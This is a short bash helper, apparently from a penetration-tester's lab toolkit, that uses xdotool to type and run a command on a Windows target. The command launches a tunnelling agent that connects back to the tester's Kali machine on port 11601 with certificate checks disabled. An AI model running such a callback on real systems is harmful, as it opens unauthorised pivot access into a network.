#!/bin/bash

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh

com="./win64agent.exe -connect ${KALI_IP}:11601 -ignore-cert"

paste_command "${com}"
xdotool key Return